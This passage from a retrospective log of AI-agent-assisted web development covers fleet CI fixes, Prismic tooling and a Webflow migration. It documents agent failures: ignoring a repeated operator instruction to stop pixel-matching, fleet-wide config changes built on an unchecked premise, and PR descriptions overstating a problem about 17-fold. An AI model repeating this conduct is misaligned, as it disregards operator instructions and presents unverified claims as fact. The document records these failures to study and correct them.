on 'Timed out waiting 120000ms from config.webServer' — **two minutes naming
neither the port nor the squatter**." And it **had already cost real work**:
"That is what it looked like on the-pointe-burbank, where it read as an
environment problem and was written off as such; **it was masking a genuinely
failing gate test across two rounds of work**." Lighthouse fails _silently_ and
worse: `startServerReadyPattern: "ready in"` matches vite's banner on whatever
port it settled on while `url` stays pinned to 5173, "so it audits the squatter
and reports those scores as the site's" — the exact failure the smoke audit's
free-port allocation was built to stop, surviving in the config a site gets
directly.

**#497 — an eslint rule right in general and wrong here.** `eslint-plugin-svelte`
3.20+ permits only `error` in `+error.svelte`, "but SvelteKit passes merged
layout `data` to error pages (reddoorla.com's live 404 renders from it), and kit
generates no `./$types` for `+error` so the prop is typed by hand. The rule has
no options (`schema: []`), so the fix is a files-scoped off-switch." Surfaced by
a lockfile refresh moving the plugin 3.19 → 3.22 — Renovate's ordinary weekly
churn shipping a behaviour change inside a patch-looking bump.

## The side project that ran in parallel all Monday and Tuesday

`scriptorium-setup` — 45 commits on 08-03 and 08-04, **16% of the week's commit
volume**, and not client work at all. It is a personal writing appliance: a 2012
MacBook running Debian, cage, foot and micro, autologin to a fullscreen
terminal, for drafting the `caldea` novel. Nothing to a working, sandbox-tested
machine image in about twenty working hours.

The arc is legible from the commits: design spec 10:34, adversarially-verified
plan 11:02, then scripts, menu, configs, systemd units, idempotent bootstrap and
docs all by 12:40 — followed by three review rounds that each found real bricking
paths a first pass does not. Without a vendored `.gitconfig` the first F5 commit
fails; bootstrap never installed sudo and dies on root-password installs;
pull-repos permanently skipped repos cloned before their first commit; and
**cage without `-s` disabled the documented Ctrl+Alt+F2 rescue path.**

**The pivotal commit is 15:31**, and its second sentence is the whole point:
_"That retires what the last commit could only claim."_ A containerised sandbox
runs the software layer on the Mac, pushing to a bare repo inside the container
"so nothing reaches GitHub", and drives micro headlessly inside tmux asserting on
the **rendered screen**. It immediately caught a defect nobody had claimed: micro
labels each tab with the path it is handed, so absolute paths filled the tab bar
and truncated all three.

The suite then grew **9 → 12 → 13 → 17 → 20 → 22 → 26 → 27 checks** across
Tuesday and repeatedly caught things reading could not. F2 and F4 were
**permanently rewriting `settings.json`** — micro persists any option changed
through the global setter, and because the toggled value equals its own built-in
default it did not merely add a line, **it DELETED the shipped `"statusline":
false`**. `write_conf` returned 1 whenever it cleared a value, "harmless in the
menu, **fatal anywhere under `set -e`**." And, notably: "The sandbox suite caught
**my own bad assertion**: I asserted F4-off would move the view back, which it
should not."

**A belief corrected with arithmetic**, at 16:39: "125 columns was never a prose
line." The panel gives 2880 px at ~221 DPI, cage running it unscaled, Courier
Prime's advance measured off the TTF at 0.5996 em, so size 12 with pad 56 was
125 columns — micro softwraps at the pane edge, "**against a typographic ideal
of 45–75.**"

**A verification trick worth stealing.** keyd is a kernel evdev remapper and
cannot run in a container or on macOS — no `/dev/input`, no uinput, no Linux
kernel. "But keyd ships `t/test-io.c`, which runs the mapping engine over a
config and a key-event list with neither devices nor root. The script builds it
at v2.5.0 and feeds it the real config … **Both mutations fail it as they
should.**" The impossible-to-test layer was tested by finding the vendor's own
engine-level harness.

And a failure mode designed out rather than tested: the session reset was keyed
off a tmpfs marker, which had "a silent, **permanent** failure mode" —
`XDG_RUNTIME_DIR` is not guaranteed under agetty autologin, and the fallback put
the marker in `~/.local/state`, where it survives reboots, so the session would
never reset again "and **nothing on screen would say why**." Re-keyed off
`/proc/sys/kernel/random/boot_id`.

`caldea` itself took ten commits of actual novel prose, and two of scriptorium's
fixes came straight out of using it: `sort -V` in the picker, because plain sort
orders a chaptered book 1, 10, 11 … 2; and resume from a breadcrumb rather than
newest mtime, because in an outlining week the newest-modified file is the
outline.

## The skill itself was reworked, hardened and calibrated — before any of the week's matching work

Before any Beachfront work happened this week, `matching-a-page` was rewritten.
The v2 commit body is the diagnosis: "The v1 doc had grown as a changelog: every
Beachfront round appended a lesson, but the workflow a fresh model must follow
was scattered across it, and **every historical miss was a skipped/nonexistent
STEP, not a detection gap.** v2 restructures the same lessons into a procedure
**a less capable model can execute.**"

Then, at 08:06, the hardening pass, whose first line is the cleanest statement of
this repo's governing rule anywhere in the corpus: **"Every change closes a
verified way a run could look green while lying."** Unresolved `--sections`
anchors "used to be silently dropped, merging two sections into one mislabelled
region with zero signal"; regions could PASS while missing their bottom
sub-block, because the pixel diff scores only the overlapping area; truncation
was reported as a note and then PASS; `--vw=390` **silently ran at 1440**;
`--flag true` silently DISABLED a boolean flag; masking ran before lazy-scroll so
lazy-loaded images escaped it; percent-encoded paths silently no-op'd with exit
0; and "the harness itself did the 700px jumps its own docs condemn."

At 10:17 the hardened harness was **calibrated against a known-good pair before
being used on anything new**, and the calibration paid immediately:

> **MASK FLAKE:** mask-photos wrote inline styles, which a hydrating framework
> re-writes AFTER masking — one run's cand cards captured photographic while
> ref's were masked (**20.8% fake fail**); the next run was clean. … Reproduced,
> fixed, re-run = region back to its 0.2% baseline.

It also found the height gate over-failing short regions (12 px on a 207 px
strip is 5.8%) and confirmed that the hardened harness "reproduces the old
baseline where the old baseline was right, and surfaced 4 real Beachfront deltas
the old harness structurally could not see … plus ~15 real type-tuple misses
**that five human review rounds never caught.**" Without that calibration run, a
20.8% number alternating run-to-run would have been chased as a page defect.

On 08-05 one more skill-level fix unlocked the census sweep: the census keys on
TEXT, not on elements, so the old rule — fail whenever the two sides' style sets
differ — "reported a byte-identical element as a mismatch whenever any same-text
sibling differed… On the beachfront-dentistry rebuild this split 100
undifferentiated rows into **69 real mismatches and 31 collisions**."

## Things tried and abandoned this week

Collected because they are the cheapest thing to lose and the most expensive to
re-walk. The paired svelte + plugin-7 majors without vite 8 (three PRs, closed,
CI red) — unrevivable; plugin 7 requires vite 8. The obvious sticky hand-mark fix
on beachfront home, attempted and **reverted**: `md:sticky md:h-[320px]
lg:h-[400px]` reproduces live's computed box exactly but adds 400 px of flow
height, taking home 24/27 → 23/27 — "**Live absorbs that 400px somewhere our DOM
does not**", so the next attempt needs live's list container measured _with the
anchor in it_. Attempt 4 on a three-strikes region, half kept and half reverted:
"REVERTED, a no-op: `h-full justify-center` on the link list … there is nothing
to centre, because our column is exactly as tall as its content. **A change that
provably did nothing is an unevidenced edit, not a partial fix**", and then the
stop — "Blocked on evidence I could not get in this pass … **Stopped rather than
swing a fifth time.**" The `mjml` v5 security bump, closed deliberately, because
the traversal requires attacker-controlled MJML source and "the only patched
version is a 5.x ALPHA, and mjml renders every client email — an alpha
regression there is a worse expected loss than an unreachable vuln." Carrying
live's `<br>` splits into the CMS, retired once the `\n` stripping was
understood. And two dead `href="#"` form CTAs on beachfront, presented as three
options, where **"Tucker chose remove"** with the fields left in the slice models
so restoring the button is one edit in Prismic the day a real URL exists.

## Corrections and course-changes — week 2

Still no transcripts, so all of these are beliefs corrected on contact or
operator judgments relayed through commit bodies and Discord.

- _"are you using the skill or winging it?"_ — the only near-verbatim operator
  challenge from this week, and it produced four written rules turned into four
  programs that exit non-zero.
- Nav underlines reverted: a pin anchored on one body link was generalised
  across the nav. +41 / −121 to undo.
- The LEED badge: "10% smaller" read as arithmetic rather than as intent.
- The cookie override-key misread, merged into two repos before it was
  understood, corrected in 14 minutes.
- #501's fleet-drift diagnosis explicitly retracted as WRONG as a cause, with
  its true half kept.
- The Prismic 403 re-tested and found to be a stale local session, not the
  token — unblocking a scripted push/seed round.
- `next.mjs` adopting a masked diagnostic as the page's state: "a diagnostic is
  never the state of the page."
- A three-strikes region released for a fourth attempt, half of it reverted as a
  provable no-op, and the round then **stopped** rather than swinging again.
- The nightly form probe: an instrument that cannot reach a failure mode must
  report what it can see, not a verdict it cannot justify.
- The WCAG contrast failure escalated to the operator with three measured
  alternatives rather than decided by the agent — and a narrow prior ACK
  explicitly refused permission to widen itself.

---

# Week 3 — 2026-08-10 to 2026-08-16

> **First week with transcripts**, and the coverage inside it is uneven in a way
> that matters: the 2026-08-12 fleet session — the one that produced the repo's
> top rule — is **not in the corpus**. 299 commits across 28 repositories, 131
> PRs opened and 108 merged, 606 site-repo CI runs at 98.0% green. 872 raw prompt
> rows dedupe to 414 and strip to **242 turns Tucker actually typed**. Only
> **nine sessions in the whole week have four or more user turns**; the work is
> concentrated in a handful of enormous parent sessions, four of which ran longer
> than forty hours of wall clock.

The week the fleet's instruments were caught lying. Three wrong diagnoses in one
Wednesday morning produced `CLAUDE.md`'s top standing rule, and the same failure
shape — a check that could never pass — turned up four more times that week in
four unrelated stacks.

**The shape of Tucker's 242 turns is itself a finding.** 25 of them (10.3%) are
him hand-operating Prismic or Slice Machine on the agent's behalf ("pushed
types", "published the migrate", "just published, verify"). 19 (7.9%) are status
polls ("anything outstanding?", "still spinning?", "ci still running?"). 21
(8.7%) are a bare "continue" / "go for it" / "resume". **27% of the week's
operator input goes on plumbing, polling and unblocking**, not on direction.

## Beachfront comes off Webflow, and the operator is the credential bus

The week opens at 16:02Z Monday with one sentence:

> "good morning, pushed this to live on friday so we could cancel webflow but
> there's still some stuff to be done, take a look at the repo and state of
> everything re:fleet onboarding and get this up to standard with everything
> else"

That session ran **84.5 hours**, 431 turns, 3,956 tool calls (2,086 of them
Bash), 3 interruptions. The first hour is ordinary: one PR clears the remaining
fleet audits (+115/−48, 14 files), another mounts the Turnstile widget in the
appointment modal.

The friction is credentials, and it recurs all week:

> 18:36Z "look in reddoor maint, you should have an access key for turnstile"
> 18:39Z "nope, i mean you, the agent, should have access to my turnstile setup through a pat"
> 18:47Z "rolled and readded to maint env"

Three turns to establish where a secret lives, ending with the operator rotating
a token and pasting it. The same pattern appears for MarkUp ("api key is in
reddor maint env" → "saved look now"), for Dropbox, and for the Prismic tokens
on 08-14 ("the tokens should all be minted, in the maint env and across other
repos on this machine, try and find them and then let me know what you're
missing" → "They're not labeled correctly, but check keys and imply which they
should be"). **The operator is the credential discovery layer**, and every one
of those exchanges costs two to four turns.

## A tool built in an evening, and shipped outside version control

> 18:51Z "ok, next thing, can you integrate with markup.io?"
> 19:03Z "let's do A"
> 19:04Z "write up the spec"
> 19:20Z "subagent works go for it"
> 20:35Z "merge the pr when green, would love to test this skill with some comments tim left in markup for beachfront"

Ninety-four minutes from question to merged design spec (+578 lines), scoped
through `AskUserQuestion`. Tucker's framing defines a category the fleet did not
have: _"none of these, I just want you to have access to them so I can fix them
in LLM driven sessions, there won't be a trickle of these there will be discrete
rounds of review, this doesn't need to tie into the fleet architecture."_

**A workflow note the corpus makes visible and nothing else does:** the spec
lives in the repo, but the artefact — `~/.claude/skills/markup-review/` — does
not. It is a user-level skill on one machine, with no version history, no
review, and no way for another session to discover how it got there. The same is
true of `CLAUDE.md` this week, untracked in `reddoor-maintenance` until #699 on
2026-09-05. **The two pieces of tooling that shaped the most agent behaviour
this week were both outside version control.**

## Tim's 31 pins, and what happens when the reference stops being the arbiter

The markup-review skill's first real run: 31 pins across 6 boards, worked as
roughly twelve fix rounds, landing as beachfront #24 — **+9,735 / −904 across 74
files**. Beachfront had been built against a pixel-matching harness that treated
the old Webflow site as ground truth. Tim's pins contradicted it, and Tucker had
to rule:

> 08-11 18:39Z "ones the original has we should follow tim's instructions instead"

That ruling removed the only automated arbiter in the loop, and the cost is
measurable in one SVG wave divider that took **five commits across three days
and four operator corrections**:

> 20:53Z "for the shape, you're adding a little bump instead of following the same consistent wave shape"
> 21:46Z "rewiggling is fine, I want a real sine wave even if it means we add some height to the page. I'm no longer concerned about matching the original webflow."
> 22:19Z "sine looks good now" … then 08-12 22:45Z "nav should still have links centered like before, sine should be only up/down on each page landing at the same height"
> 08-13 01:18Z "the wave svg has two sine wave, I want a single up and then down, coming back to neutral on both side, should be the same on any screen size"

**The belief corrected on contact:** the team believed the reference site was
the spec. Once the designer outranked it, nothing in the toolchain could
evaluate "right", and the operator became the gate for a shape — six turns of
visual judgement that no test could have absorbed. One commit names the
collateral damage in its own subject — _"the menu links stay centered — H2's
gutter alignment was a misread"_ — the agent having over-generalised one of
Tim's pins across the nav, exactly as it had on the-pointe a week earlier.

## Three things that shipped, passed every check, and did nothing

All three found on 08-12 by probing the running page, none by any gate, and all
three only because Tucker asked for a motion audit: _"do a full pass of the site
for improvements we could make, especially with an eye towards animations /
hovers."_

**The nav transition that never ran.** `transition:fly={{y:-800,
duration:700}}` sat on an overlay one `{#if}` block deeper than the one that
toggles it. Svelte transitions are local by default, so it played on its own
block's creation and never on the ancestor's. _"It parsed, type-checked, linted
and shipped, and animated nothing — probed frame by frame, opacity 1 and
transform none from the first frame after the click."_ The fix is `|global`, and
the rebuilt entrance is measured rather than guessed: rows rise 22 px over 300
ms, 45 ms apart, after a 90 ms lead, "because on expoOut the wash is ~0.88 opaque
at 90ms."

**The Playwright option that never reached the page.** The suite set `use: {
reducedMotion: "reduce" }`. Probed, the page still reports
`matchMedia("(prefers-reduced-motion: reduce)").matches === false` at config,
project and test level; only an explicit `page.emulateMedia()` flips it. _"So
every spec that believed it ran reduced was running with motion ON."_ Removing
it changed nothing at runtime — 71/71 still passed — which is exactly the point.
(This one resurfaces in week 6 with three months of consequences attached.)

**The spec that could not see the bug it existed to catch.** Its scroll pass used
`scrollTo(0, y)`, which obeys the page's `scroll-behavior: smooth`, so on an
8,000 px page it never got past ~122 px and fired almost none of the reveals. It
then read opacity from the immediate parent when the reveal lives on an
ancestor, so it policed hidden elements at their pre-reveal offsets. "That is
why trimming the reveal travel turned four passing cases red without changing a
rendered pixel." Once honest, it immediately caught a real defect: the FIJI label
renders at opacity 1 inside the footer wave at 390/480/700, baselines measured at
80.4 / 76.8 / 68.0 px.

## The 08-12 fleet morning — three wrong diagnoses, and the rule they produced

> **RECONSTRUCTED.** The session is missing from the corpus. Primary evidence is
> the PR bodies, which argue the case in full and are minute-stamped, plus a
> memory note written the same afternoon. No prompt of Tucker's from that session
> survives, and none is invented here.

This is the episode `CLAUDE.md`'s top rule is built on. The three failures are
not three mistakes; they are one mistake three times.

**(a) A belief nobody checked, propagated through three config PRs in three
days.** On 08-10 a session diagnosed a red CI run and wrote the cause into
`.github`#26: _"Fleet CI's pnpm 11 policy (minimumReleaseAge=1440) rejects
lockfile entries younger than 24h, but the preset had no matching gate on the
Renovate side"_ — which justified adding a fleet-wide `minimumReleaseAge: "1
day"` to the Renovate preset. On 08-11, `.github`#27 exempted lockfile
maintenance from the new gate, repeating the premise verbatim. On 08-12,
`.github`#28 finally read the source:

> "it justified the exemption on a pnpm supply-chain policy rejecting lockfile
> entries younger than 24h. **No such gate exists** — every fleet repo sets
> `minimumReleaseAge: 0` in `pnpm-workspace.yaml` (10/10 sampled, including
> reddoor-starter, which every site clones)."

Three fleet-wide preset changes in 72 hours, all downstream of one premise that
took a `grep` to disprove. The second-order cost was real: #26's gate emitted a
pending `renovate/stability-days` status that **froze all 11 lockfile PRs of the
Monday batch**, which is what #27 then existed to undo.

**(b) A true fix shipped with a false story, merged one minute after opening.**
`.github`#28 opened 18:31Z and **merged 18:32Z**, claiming _"18 non-major PRs
across the fleet sat CI-green, CLEAN, automerge-eligible and unmerged."_
`.github`#29, merged 51 minutes later, retracts it: _"16 of the 17 site PRs were
never automerge-eligible. `group:allNonMajor` groups `@reddoorla/maintenance`
into nearly every site's non-major branch, and the never-auto-merge packageRule
for graph-reshaping packages therefore applies to the whole grouped branch. Those
PRs were correctly awaiting a human and a green Netlify deploy preview — **the
rule doing precisely its job**."_ The mechanism was real and the blast radius was
overstated by 17×. The corollary that entered `CLAUDE.md` comes from this PR
verbatim: _before calling green unmerged PRs "stuck", check whether a packageRule
is deliberately holding them._

**(c) A gate that could never pass, whose own commit message argues it is
sound.** #521 added a `preview_site` workflow_dispatch input to daily-reports so
the GA and Search Console secrets could be proven on demand. Its reason for
existing is airtight and confirmed by Airtable — **no report row was created
anywhere in the fleet between 2026-07-30 and 2026-08-24** — and is stated as
"the only thing that can confirm them is a naturally-due report, and the earliest
is Sonder on 2026-08-31: a three-week feedback loop on a credential that either
works or silently does not."

Its reasoning for _correctness_ is also carefully argued, and wrong: "The verdict
step greps the rendered HTML for the ANALYTICS block, which
`renderAnalyticsSection` emits only when `hasAnalyticsData()` is true. Its
presence is therefore a **non-circular proof** that the credentials resolved and
real numbers came back." Non-circular, yes. Capable of passing, no. #523 found
why:

> "`draftReportForSite` used `base === null` to mean two unrelated things: never
> write to Airtable, AND perform no IO at all… The conflation made `report
<slug> --preview` **structurally incapable of ever rendering an ANALYTICS
> section**, however good the GA credentials were. #521 then built a CI
> credential proof on top of that path, so it failed 100% of the time and
> reported the result as 'GA/Search Console credentials did not resolve' — a
> confident, always-wrong alarm sitting in main, on exactly the surface whose job
> is making real failures visible. **Both of today's preview runs (Sonder,
> Reddoor) were that instrument failing, not the secrets.**"

The credentials had been fine since 08-10. Once fixed, `preview_site: Reddoor`
rendered **1,869 Users ▲127% (824 → 1,869)**.

The repair chain, minute by minute UTC: 18:36 #521 opened; 19:07 merged; the
first real run dies on `No Websites row matched slug "Sonder"`; 19:24 #522 opened
to slugify the input; 19:36 merged — _the input the gate documents did not work_;
two runs then report "GA credentials did not resolve"; 20:50 #523 opened; 20:57
merged. **Two hours and twenty-one minutes, and three merges, to make one check
capable of a green.** #522 contains the week's best piece of honest accounting,
about its own failure: _"the draft step's `continue-on-error` masked the exit
code as success, and the ANALYTICS verify step is what actually failed the run.
**That is the gate doing its job on the first try.**"_

**(d) The one thing that worked, and the discipline it demonstrates.** The same
session had to answer "does `setup-node` v7 break `release.yml`'s npm publish".
Instead of arguing, it built a throwaway branch with a push-triggered workflow
running **v6 and v7 as two literal jobs under release.yml's exact conditions**.
Result: v6 exports a dummy `NODE_AUTH_TOKEN`, v7 leaves it unset; npm does emit
`Failed to replace env in config` under v7 — but as `[WARN]`, and **every return
code is identical**. Two caveats were recorded at the time and both are
load-bearing: `npm publish --dry-run` returns rc=1 under _both_ versions, so the
probe proves "no regression" and not "publish works"; and a step's `uses:`
accepts no expressions, so a matrix over action SHAs fails the whole run as a
workflow-file error, hence two literal jobs. And `CLAUDE.md` records that the
probe's own `VERDICT` line printed "OK" for both versions because it grepped the
wrong command — **the real answer came from reading the raw output.** Even the
probe's summariser needed proving.

**What the week actually taught.** All three failures are the same shape:
_something was built on a mechanism whose implementation was never read._ Two of
them were one file-read away from never happening. The rule that came out of it
is not a general principle someone liked; it is the minimum procedure that would
have caught all three.

**And the rule had no home.** `CLAUDE.md` was untracked in this repo until
2026-09-05. The most expensive lesson of the week was written into a file with
no history, on one machine, three weeks before anyone could diff it.

## The Figma board becomes a product, and the operator becomes the CMS

At 22:29Z Tuesday, a one-paragraph brief into `reddoor-website`:

> "https://www.figma.com/design/…/RD-Sales-Funnel-LP?node-id=3074-2227 want to
> add this (board v2 only, see the comments). should be at /medtech, with the
> ability to make more of these for different industries with the slice model.
> reuse slices we already have if possible, make new ones if now."

That became a new Prismic custom type, ~11 slices, two upstreamed to
`reddoor-starter`, and a 10,147-line PR. The session ran **49.4 hours, 152
turns, 4,655 tool calls and 9 interruptions** — the densest of the week.

**The PR-as-preview pattern, which any tool reading this repo must understand.**
At 16:45Z: _"can we commite and open a PR so I have a netlify deploy preview to
look at + share?"_ That PR exists to produce a URL, not to merge. It was **closed
unmerged**, as was its successor (14,269 additions, 89 files). The work landed
weeks later under a third PR measured from `origin/main`. The deploy preview was
shared into `#rd-website` and the team reviewed there. **The PR is the review
surface; merging is a separate, much later decision.** Any tooling that assumes
open-PR ≈ merge-intent will misread this repo badly.

**The Prismic hand-crank.** Twenty-five of Tucker's 242 turns are him operating
Prismic because the agent cannot: _"pushed types"_, _"published the migrate"_,
_"pushed, let me know when i need to click the migration"_, _"slice machine
pushed, check discord nicole just added a link with mobile crops"_, _"published
migration release"_, _"just published, verify"_, _"prismic draft is published"_,
_"i don't see a migration releae and yes, commit"_, _"open slice machine for
me"_. **A human click sat inside an otherwise automated loop, and it cost ~10% of
all operator attention.** It is also the demand signal that produced the week's
largest engineering project.

**A cross-chat collision, measured.** At **19:27Z** Tucker tells reddoor-website
_"we're supposed to match the figma exactly, that's why its there"_. At
**19:30Z** he tells beachfront _"ignore my last message, put it in the wrong
chat"_. Three minutes, two sessions, and the standing instructions in those two
sessions were **opposites** — beachfront had abandoned pixel-matching the day
before. Running parallel long-lived sessions with contradictory standing orders
is a real hazard here, and it fired. (The countermeasure that eventually ships is
a colour: see week 6.)

His other corrections in that session are short and structural: _"don't roll your
own slideshow, we have a component for that"_ — three and a half weeks before
that becomes the defining friction of week 7; _"figma is source of truth, google
doc is for any information missing from it"_; and one walking back his own
instruction, _"on second thought, ideally we keep the toggle, just use the
variation or a blank Spacer slice if that's easier. Trying to keep this easy and
unbreakable design wise."_

Two genuine defects in the same work were found by measuring rather than looking.
The carousel box was a hardcoded `aspect-video`, and **no slideshow on the site
is 16:9** — published sets run 1.29 to 1.62; `/portfolio/champion` spent **37%**
of its box on empty side bars, `/portfolio/toyota` 19%, and one piece at 2.215
was letterboxed into a box taller than its artwork, across 18 slices on 11 pages.
And `ScreenWidthMedia`'s aspect ternary fell through to `""` — harmless for
`<img>`, which has intrinsic dimensions, fatal for `<iframe>`, which does not: a
full-bleed video rendered as a **1440×150** letterbox slot, which is exactly what
a colleague reported in Discord the next day. A third commit is **an audit
flagging a defect that did not exist**: the slideshow-ratio flag compares spread
against a 1% tolerance, but the per-slide "odd one out" marker compared
`toFixed(3)` strings, so an 1800×1199 export sitting **0.09%** off its 1800×1200
neighbours landed the wrong side of the third decimal.

## The stale types, the trap, and the fleet's biggest build of the week

**The discovery.** While clearing beachfront's Prismic work, a commit found
`src/prismicio-types.d.ts` badly stale and measured it: **150 declared types
against the 189 the models produce**, missing **four entire slices** plus every
variation of Hero, Carousel and CollectionList, and still listing **11 dead
`blux_*` choices**. The root cause is structural, not neglect: the file says
"Code generated by Slice Machine. DO NOT EDIT", "and there was **no way to obey
both halves of that sentence**. The adapter emits it from a custom-type WRITE
hook, which only fires through Slice Machine's UI."

**The trap, and Tucker asking to be told about it.** At 01:06Z: **"merge on
green, describe the trap to me"** — merged at 01:07Z. The trap materialised the
next day: a lockfile refresh had left **two copies of `@slicemachine/manager` in
the pnpm store (0.27.4 and 0.27.5)**, and the regeneration script found the
package by scanning the store and taking whichever directory `readdir` returned
first — 0.27.4 — while `slice-machine-ui` resolves 0.27.5. _"Today they agree and
the script still reports 'up to date'; the day they stop agreeing, the symptom is
a diff nobody ordered."_ Six minutes after the merge: **"add this as a fleet wide
issue to be tackled in future probably tomorrow"**. It was tackled that night.

**The spec that is the counter-example to the 08-12 morning.** Approved at 23:18Z
— _"this spec looks good, write the plan"_ — one hour and twenty minutes after
#523 fixed the false alarm. It opens with a proof table of six live probes, and
says why: _"`PRISMIC_WRITE_TOKEN` @ gallerysonder, reddoor-la — **403**… The 403
row matters as much as the 200s. It reproduces the historical failure that
produced the standing 'types can only push via Slice Machine' rule, and localises
it: the deny is a property of *that one older token*, not of the Types API. **Same
probe, five passes and one controlled reproduction of the known failure — this
satisfies the prove-the-instrument rule in CLAUDE.md.**"_

It also carries a **"Refuted — do not re-propose"** section: Prismic's Type
Builder is an Admin-only web UI with no branch, PR or CI (adopting it would
_remove_ Git as the gate); `PRISMIC_TOKEN` is an undocumented user-session token
that cannot bootstrap in CI; and `prismic init` is destructive — it `rm -r`s
local slice directories absent from the remote, component code included, even
under `--no-setup`. **Four dead ends written down so nobody walks them twice.**
That section is the most reusable artefact of the week.

**Execution and follow-ups.** "subagent", then "continue on" four times across two
days, in a worktree: 42.5 hours, 89 turns, 38 general-purpose and 10
code-reviewer subagents, landing **+24,211 / −16 across 66 files**. The reusable
workflow splits the dry and apply paths into **separate jobs rather than steps**,
because "job permissions cannot be conditional… Each path is INCAPABLE of the
other's action rather than merely told not to" — and records that an earlier
draft gating on `github.event_name == 'push'` alone would have pushed a feature
branch's models to production.

Three follow-ups, each a correction. `reddoor-wireframer` is a placeholder **that
resolves**: HTTP 200, two starter documents last published 2024-03-12, "so no
failed lookup will ever expose it as a placeholder the way a 404 would" — left
unlisted it is a permanent `unknown` and a nightly cockpit warning no credential
can clear. A minus line said the opposite of what it meant: `- variation rail
(REMOVED remotely)` read as "the remote removed it"; the truth is the reverse —
Prismic still **has** it, and pushing is what deletes it, "taking the document
data with it at HTTP 200 and no warning" — fixed before the workflow reached
client repos, because that wording is what CI posts on every model PR. (The same
PR fixed **two digest tests that had been red on `main` for four days**: both
asserted on a fixture stamped 2026-08-12 while letting the code fall back to the
real clock, so once time crossed a three-day staleness window they failed. Code
right in both readings; the tests were time-dependent. That class comes back with
interest in week 4.) And the third refuses to install a workflow the site's own
CLI cannot run: measured at publish, **all twelve delivery candidates pinned
something older, 0.28.0 through 0.82.0 — a rollout that day would have broken
every one.** It reads the lockfile, not the package.json range, and has three
distinct refusals — too old / cannot establish / ambiguous — "because a gate that
cannot tell 'too old' from 'could not read' reports one as the other."

**The operator unlocks the rollout.** 08-16 17:40Z: **"why do we have to wait
until monday rather than bumping all the repos now?"** Eleven minutes later, 12
manual bump PRs open; they merge 18:18–18:19Z; the 7 delivery-workflow PRs open
18:30Z and merge 18:50Z. **Seventy minutes from question to a fleet-wide CI
rollout**, which the Renovate schedule would have delayed by two days.

**And then the instrument was proven, properly.** `caltex-landing#54` adds a
temporary probe field to prove headless model delivery, merged 19:33Z; `#55`
reverts it, merged 19:37Z. **Four minutes, on a live client repo, with the revert
pre-planned.** That is the 08-12 lesson executed correctly, four days later.

## "I've said three times now we're not matching anymore"

Thursday 20:48Z, the sharpest operator intervention of the week:

> **"what are you checking right now? I've said three times now we're not
> matching anymore"**

He had. 08-11 21:46Z: _"I'm no longer concerned about matching the original
webflow."_ 08-12 16:24Z: _"yep we're no longer chasing matching so that's fine."_
And the compaction summary injected at 08-12 22:14Z states it as a standing
constraint in its own first paragraph: _"The pixel-matching program has ENDED —
`matching/` gates are not to be run."_ **The instruction survived compaction and
was violated anyway**, thirty minutes after the agent had committed a fix _to the
matching harness_.

**Honest accounting: the disobedient run found something real, and Tucker kept
it.** The commit in question:

> "The mechanical check for CLAUDE.md rule 3 (three strikes, then stop) was
> **failing OPEN**, which is the one way this particular check may not fail.
> `strikes.mjs` derives the page name from the ref URL, while `gate.sh` and
> `next.mjs` key on the gate page KEY. Those agree only where the key equals the
> path — home, our-team, services… an empty match then printed 'strikes: clear —
> no failing region has stalled' and exited 0. **Rule 3 was therefore enforced on
> 10 of 33 stalled regions.** yfv, contact, atd, svc, qa and team reported clear
> while holding 4/2/3/5/4/5 stalled regions — **23 hidden, every one flat for 16+
> runs.**"

Tucker's reply, one minute later: _"do the strikes fix, you can merge these in,
anything else outstanding?"_ A fifth instrument found lying, in a harness that
had already been decommissioned.

One more minute of friction from the same session, at 21:59Z: after the agent
proposed a next step, Tucker asks **"what do you mean remeasure?"** The agent had
drifted into its own vocabulary.

## The weekend: the same failure shape, in three unrelated stacks

**The LED turn counter.** The checkout is
`~/Documents/GitHub/octagonal-led-turn-counter/octagonal-led-turn-counter` and
its remote is **`tucksravin/the-bench`** — a live instance of the
directory-name ≠ repository-name hazard `CLAUDE.md` warns about. Its 08-15 commit
is the 08-12 morning again, in C++:

> "**ota_flash: drop the TCP pre-flight, which could never pass.** ArduinoOTA's
> port 3232 is UDP… The pre-flight used `socket.create_connection()`, so it
> probed TCP 3232 and failed against a healthy board that had just printed 'OTA
> ready'. **It blocked every push, not just broken ones.** …Found on the first
> real push. The unit tests never touched this: they covered secrets parsing and
> platform discovery, not the protocol assumption underneath, which is where the
> bug was."

A gate that had never passed, three days after the GA one, in a different
language, a different repo and a different domain — written by a session with no
access to the fleet's `CLAUDE.md`.

The rest of that weekend is a good model of review-heavy work: one commit fixes
**13 defects found by a 54-agent adversarial review of two plans' diff, of which
24 findings survived verification** before deduping. A tap guard went v1 → v2
because "adversarial review of v1 confirmed four majors sharing one root: rate
bands overlap human play in both directions", and the replacement discriminator
is measured — loudness duty cycle, "taps top out ~10% even machine-gunned, hum
sits at 50%, pinned at 100%." And the real control was physical: _"I'm going to
try replacing the piezo"_ → _"alright new peizo in and this looks better."_ The
firmware guard had been compensating for a dying sensor.

**scriptorium-setup**, 08-16, a third dead instrument: _"**the wi-fi check asks
after a hostname google deleted.** `connectivity-check.gstatic.com` (hyphenated)
went NXDOMAIN, so **every network on earth read as 'joined, but no route
out'**."_ Tucker's report was the classic symptom of an alarm rather than a
fault: _"our wifi went out yesterday, now the scriptorium connects but I get the
error that it's offline. same pattern on my phone hotspot and home wifi."_
Same-symptom-everywhere is the tell, and it took the agent one probe.

**Broken** (a Godot game, with a collaborator) is the only place all week where
Tucker is doing pure creative direction, and he corrects the agent's reading
twice:

> "you're misreading the green bottom, that will eventuall be your legs (tank
> treads). for the jam we just want the head, torso and arm"
> "fictionwise you're still incorrect, it's a dark ending. you've been
> homogenizing which is the greater purpose of the strip miner, to smooth the
> earth and extract. **the work you do is fixing the maching by erasing all the
> beautiful little imperfections you find along the way**"

The agent had written the anti-entropy theme as redemptive; Tucker inverted it,
and the commits follow the correction exactly. **Two turns to move a whole design
document's premise.**

And `caldea` — eleven commits of novel prose across the week, with **zero
sessions and zero prompts in the corpus**. The one thing done entirely by hand.

## Sunday's sub-pixel endgame, and the operator asking for a measurement loop

The `/medtech` process section went through five commits in six hours on the
strength of Tucker looking at it:

> 18:54Z "process section: no line above it arrows don't match the design, we should also do a custom animatation for them in as we scroll down…"
> 20:05Z "the animation still results in the heads of the arrows not touching the line, **please use playwright to check things as you build them**. numbers in the circles appear very slightly off center, can you confirm and fix?"
> 22:45Z "**you're wrong about animateIn**, the vertical cascade happens because of scroll triggers and feels better and more reactive that way, don't do the vertical list"
> 23:34Z "the numbers still feel off center to me, too far to the right in the circles"

Each correction produced a commit worth reading as an example of the measurement
quality this codebase reaches when pushed. The animateIn reversal, in the agent's
